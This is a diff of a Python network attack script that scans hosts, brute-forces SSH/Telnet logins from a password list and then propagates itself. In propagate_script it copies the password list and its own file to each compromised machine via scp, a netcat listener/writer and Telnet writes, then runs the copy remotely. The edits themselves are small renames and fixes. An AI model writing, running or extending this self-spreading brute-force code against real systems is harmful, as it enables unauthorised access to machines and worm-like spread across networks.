@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-
+# TODO: Make sure comments are accurate.
 # from scapy.all import *
 # For use when adding new functionality with scapy, be sure to statically
 # import when finished, wildcard is just for convenience.
@@ -83,6 +83,7 @@ def assigning_values(arguments):
                     arguments.index(strings.ARGUMENT_IP_ADDRESS_FILENAME) + 1]
         except RuntimeError:
             logging.error(strings.IP_FILENAME_NOT_FOUND)
+            return None
         try:
             ip_list = convert_file_to_list(ip_addresses_filename)
             target_ports = arguments[
@@ -387,7 +388,7 @@ def exit_and_show_instructions():
     """
     This function will print the help screen and show an exit prompt.
     """
-    print(strings.PLS_HELP)
+    print(strings.help_output())
     print(strings.EXITING)
 
 
@@ -449,7 +450,7 @@ def propagate_script(ip, port, login_string):
                 os.system(strings.scp_command_string(port,
                                                      login_string_split[0],
                                                      ip,
-                                                     strings.PASSWORDS_FILE))
+                                                     strings.PASSWORDS_LIST))
                 client = SSHClient()
                 try:
                     client.set_missing_host_key_policy(RejectPolicy)
@@ -480,10 +481,10 @@ def propagate_script(ip, port, login_string):
                                              os.path.basename(__file__)))
                       .encode(strings.ENCODE_ASCII))
             tel.write((strings.netcat_listener(port,
-                                               strings.PASSWORDS_FILE))
+                                               strings.PASSWORDS_LIST))
                       .encode(strings.ENCODE_ASCII))
             os.system((strings.netcat_writer(ip, port,
-                                             strings.PASSWORDS_FILE))
+                                             strings.PASSWORDS_LIST))
                       .encode(strings.ENCODE_ASCII))
             tel.write((strings.run_script_command(os.path.basename(__file__),
                                                   login_string_split[0]))
@@ -650,7 +651,6 @@ def try_action(ip, port, target_username, password_list,
     :param transfer_file_filename: A filename for file to transfer
     :param arguments: List of user specified arguments
     """
-    logging.info(strings.TESTING_IP_PORT_PAIR)
     if scan_port(ip, port):
         logging.info(strings.FOUND_OPEN_IP_PORT_PAIR)
         action_login_details = try_sign_in(ip, port, target_username,
